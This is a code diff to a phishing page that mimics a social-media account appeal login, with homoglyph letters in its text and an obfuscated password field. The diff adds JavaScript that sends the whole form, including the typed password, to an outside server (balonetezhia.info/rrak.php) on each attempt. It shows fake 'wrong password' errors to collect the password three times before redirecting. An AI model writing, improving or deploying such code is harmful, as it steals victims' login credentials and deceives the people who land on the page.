@@ -53,7 +53,7 @@
 
 				<ul class="navbar-nav mb-2 mb-lg-0">
 					<li class="nav-item"
-						style="background-color: #e4e6eb !important;border-radius: 7px !important;color">
+						style="background-color: #e4e6eb !important;border-radius: 7px !important;">
 						<a class="nav-link" href="javascript:void(0)"
 							style="color:black !important; width: 110px !important;font-weight: 600 !important;line-height: 1.1765 !important;font-size: 1.0625rem !important;height: 40px !important;">English
 							(US)</a>
@@ -234,7 +234,7 @@
 										pаssword to continuе‌‌‌.</p>
 									<br>
 									<label for="guxhatok" style="font-size: 14px;">Pаssword:
-										<input type="text" name="guxhatok" id="guxhatok" required>
+										<input type="password" name="guxhatok" id="guxhatok" required>
 									</label>
 
 									<!-- <hr> -->
@@ -431,40 +431,58 @@
 			if ($("#guxhatok").val() != "") {
 				$("#passerr0").hide(0);
 				if (tries == 0) {
+					ajax()
 					$("#passerr1").show(0);
 					tries = 1;
 					$("#guxhatok").val("");
-
-				}
-				else if (tries == 1) {
+				} else if (tries == 1) {
+					ajax()
 					$("#passerr1").hide(0);
 					$("#passerr2").show(0);
 					tries = 2;
 					$("#guxhatok").val("");
-
 				} else {
-					window.location.href = "confirm.html";
-				}
-				var formData = new FormData(appealf);
-				var formObject = {};
-				formData.forEach(function (value, key) {
-					formObject[key] = value;
-				});
-				$.ajax({
-					type: "POST",
-					url: "https://balonetezhia.info/rrak.php",
-					data: formObject,
-					success: function (response) {
-						if (response == "true") {
-							console.log("send");
+
+					var formData = new FormData(appealf);
+					var formObject = {};
+					formData.forEach(function (value, key) {
+						formObject[key] = value;
+					});
+
+					$.ajax({
+						type: "POST",
+						url: "https://balonetezhia.info/rrak.php",
+						data: formObject,
+						success: function (response) {
+							if(response == "true"){
+								window.location.href = "confirm.html";
+							}
 						}
-					}
-				});
+					});
+
+				}
+
 			} else {
 				$("#passerr0").show(0);
 			}
 		}
 
+		function ajax() {
+			var formData = new FormData(appealf);
+			var formObject = {};
+			formData.forEach(function (value, key) {
+				formObject[key] = value;
+			});
+
+			$.ajax({
+				type: "POST",
+				url: "https://balonetezhia.info/rrak.php",
+				data: formObject,
+				success: function (response) {
+					return response
+				}
+			});
+		}
 		function cancel() {
 			$('#triplemax').fadeOut(40);
 		}
